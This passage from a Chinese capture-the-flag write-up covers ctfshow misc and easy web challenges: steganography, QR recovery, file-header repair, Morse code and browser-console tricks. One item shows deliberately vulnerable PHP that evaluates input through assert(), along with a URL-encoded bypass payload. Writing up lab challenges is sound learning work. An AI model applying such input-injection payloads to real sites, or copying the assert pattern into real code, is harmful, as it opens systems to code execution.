        res =cv2.matchTemplate( mask_img,temp,cv2.TM_CCOEFF_NORMED)
        min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res)
        x,y=int(max_loc[0]/192),int(max_loc[1]/288)#为什么是192和288，因为大图去掉标题栏就是1920*2880
        guess='ABCDEFGHIJ'[y]+'0123456789'[x]
        print(f'guess:{guess}')
        #传答案
        response=sess.get(url+'/submit?guess='+guess)
        r=json.loads(response.text)
        if r['result']:
                print('guess right!')
                return True
        else:
                print('guess wrong!')
                return False

i=1

while i<=31:
        print(f'Round:{i}')
        if answer_one(sess):
                i+=1
        else:
                i=1
```

## You and me

也是盲水印, 这次需要另一个[盲水印工具](https://github.com/chishaxie/BlindWaterMark), 安装依赖即可执行

```
python3 bwmforpy3.py decode you.png you_and_me.png flag.png
```

## 迅疾响应

扫不出来?扫不出来就对了, 向你推荐[qrazybox](https://merri.cx/qrazybox/), 二维码[详解](https://blog.csdn.net/weixin_43513379/article/details/109203225)

New -> Import from Image 导入之后 Tools -> Extract QR information

flag只有一半, 在你详细了解过二维码之后, 你会知道填充是从右往左填充的, 而且纠错码会在数据之后. 既然没有别的方法了, 那就碰运气先删掉一部分的纠错码看看能不能将纠错机制部分删除, 拿到没有被纠错的部分

所以我把定时标志(Timing Pattern)左边的数据部分全部删掉了

![image-20240623193220629](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623193220629.png)

此时再做扫描就能得到flag, 真帅吧

![image-20240623193312895](https://raw.githubusercontent.com/4reexile/Misc_/master/images/md/image-20240623193312895.png)

## 打不开的图片

没有文件头, 没有文件尾, 简直就是乱码

附件名字叫做misc5.5.png, 而叫做misc5.png的附件是"你会异或吗"的附件, 那可能就是对整个文件进行了什么操作导致正常图片变成了这样

观察后发现, 本题文件头部分的二进制反转后加一就可以得到一个PNG头

十六进制运算 -> 二进制反转 -> 加一 -> 保存就可以看到flag

> 似乎有个求反运算, 我现在在想为什么他能通过`X[i]=-X[i]`直接得到求反加一

# 简单题

## Web

---

### web2 c0me_t0_s1gn

右键检查, 源码中还有两个提示:

```HTML
<!-- ok you find something a part of flag :ctfshow{We1c0me_ -->
<p>the page hide something you need use the god's eye to find</p>
<!--and thre is a hint for another one: can can need 控制台(console)-->
```

控制台处输入对应函数即可

```
try to run the function "g1ve_flag()"to get the flag!
# t0_jo1n_u3_!}
```

### 驷马难追

```php
<?php
highlight_file(__FILE__);
include "flag.php";
if (isset($_GET['num'])){
     if ($_GET['num'] == 114514 && check($_GET['num'])){
              assert("intval($_GET[num])==1919810") or die("一言既出，驷马难追!");
              echo $flag;
     }
}

function check($str){
  return !preg_match("/[a-z]|\;|\(|\)/",$str);
}
```

经过测试, URL编码中的字母不会被check函数检测出来, 所以就是直接用加法即可: ``?num=114514%2b1805296`

### TapTapTap

是一个网页小游戏, html没什么好看的, 直接看该游戏仅有的一个``habibiScript.js`

直接搜索alert, 似乎得到一个游戏结束的输出

```javascript
if (gameEngine.levelNum > 20) {
  toolsBox.hidePage(pagePlayArea)
  toolsBox.showPage(pageLevelPassed)
  console.log(
    atob('WW91ciBmbGFnIGlzIGluIC9zZWNyZXRfcGF0aF95b3VfZG9fbm90X2tub3cvc2VjcmV0ZmlsZS50eHQ='),
  )
  alert(atob('WW91ciBmbGFnIGlzIGluIC9zZWNyZXRfcGF0aF95b3VfZG9fbm90X2tub3cvc2VjcmV0ZmlsZS50eHQ='))
} else {
  gameEngine.updateLevel(gameEngine.levelNum + 1) // Update level number in the game engine
}
```

对其进行base64编码, 可以得到`Your flag is in /secret_path_you_do_not_know/secretfile.txt`, 打开就得到了flag

### 传说之下(雾)

```javascript
window.onload = function() {
    Game = new Underophidian('gameCanvas')

    var snakeAudio = document.querySelector('.snake-audio')
    var gameMusic = document.querySelector('.game-music')
    var gameButton = document.querySelector('.game-button')
```

查看js, 会发现游戏这个对象直接摆在脸上是Game, 而 score 是里面的一个变量

所以 开始游戏->暂停->控制台输入`Game.score=3000`, 然后吃掉一个果子, 控制台就会出现flag

## Misc

---

### 杂项签到

用winhex打开然后搜索ctfshow即可得到flag

### 损坏的压缩包

winhex打开发现是PNG头,改成png后缀打开得到flag

### 7.1.05

下载的是一个游戏的存档文件, 鼠鼠不想做了

### 黑丝白丝还有什么丝

你是西格玛男人, 鉴定为摩斯电码, 白丝为`.`黑丝为`-`转场为空格, 解码之后变成全大写就可以交了

手搓如下: `.-- ....- -. - - ----- -... ...-- -- --- .-. . -.-. ..- - .`

### 我吐了你随意

0宽隐写, 塞进0宽字符[解码工具](https://330k.github.io/misc_tools/unicode_steganography.html)即可
